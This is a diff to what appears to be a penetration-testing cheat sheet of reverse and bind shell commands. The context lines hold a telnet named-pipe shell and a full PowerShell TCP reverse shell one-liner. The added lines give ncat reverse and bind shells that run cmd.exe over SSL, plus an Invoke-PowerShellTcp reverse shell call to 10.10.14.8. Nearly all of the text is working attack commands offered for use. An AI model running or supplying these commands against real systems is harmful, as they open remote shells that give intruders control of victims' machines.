@@ -42,6 +42,28 @@ rm -f /tmp/p; mknod /tmp/p p && telnet $source_ip $source_port 0/tmp/p
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$source_ip",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
+### ncat
+
+#### Reverse Shell
+Attacker:
+```
+ncat -lnvp $source_port --allow $target --ssl
+```
+Victim:
+```
+ncat -nv $source_ip $source_port -e cmd.exe --ssl
+```
+
+#### Bind Shell
+Victim:
+```
+ncat -lnvp $source_port -e cmd.exe --allow $source_ip --ssl
+```
+Attacker:
+```
+ncat -nv $target $source_port --ssl
+```
+
 ## Programming Languages
 
 ### Linux
@@ -94,3 +116,7 @@ export TERM=xterm-256color
 stty rows 38 columns 116
 ```
 
+
+
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 9999
